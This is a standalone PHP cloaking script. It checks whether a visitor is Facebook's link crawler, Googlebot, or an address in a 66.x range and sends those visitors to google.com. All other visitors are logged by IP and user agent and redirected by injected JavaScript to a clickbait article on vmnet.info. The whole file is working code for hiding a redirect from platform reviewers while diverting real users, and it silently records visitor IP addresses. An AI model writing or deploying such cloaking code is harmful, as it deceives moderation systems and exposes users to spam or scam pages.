
<?php
function checkIP($ip) {
  $lowIp = ip2long('66.100.0.0');
$highIp = ip2long('66.255.255.255');
  if ($ip <= $highIp && $lowIp <= $ip) {
      return true;
  }
}
$allowedAgents = "allowedAgentsmDcGrQ0XZ7C5R5hzsjvzeii3PrAuaCdZSanQGOJ2Hs2OBm7lVgL46bEWFA1oo4-N0v1wUwqY3BIHTVkNWJpgnxy8LFDSyutIfjK9.txt";
$blockedAgents = "blockedAgentsmDcGrQ0XZ7C5R5hzsjvzeii3PrAuaCdZSanQGOJ2Hs2OBm7lVgL46bEWFA1oo4-N0v1wUwqY3BIHTVkNWJpgnxy8LFDSyutIfjK9.txt";


$ip =  ip2long($_SERVER['REMOTE_ADDR']);
// function ip_details($ip)
// {
//     $json       = file_get_contents("http://ipinfo.io/{$ip}");
//     $details    = json_decode($json);
//     return $details;
// }

// $details = ip_details($ip);
// $country = $details->country;
if (
   strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
 strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || checkIP($ip)
) {
  $fAgent = fopen($blockedAgents, 'a');
  $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] .' blocked ' . PHP_EOL;
  fwrite($fAgent, $agent);
  fclose($fAgent);
  header('Location: http://google.com', true, 301);
die();

 }
else {
  $fAgent = fopen($allowedAgents, 'a');
  $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] .' ok ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    echo "
<script type='text/javascript'>// <![CDATA[
var d='<data:blog.url/>';
d=d.replace(/.*\/\/[^\/]*/, '');
location.href = 'http://vmnet.info/con-trai-ngoa%CC%A3i-tinh-me%CC%A3-chong-ban-voi-con-dau-da%CC%A3t-tiec-roi-dua-40-cay-vang-ra-va-tuyen-bo-1-chuye%CC%A3n-do%CC%A3ng-troi/';
// ]]></script>
";
    die();
}
?>
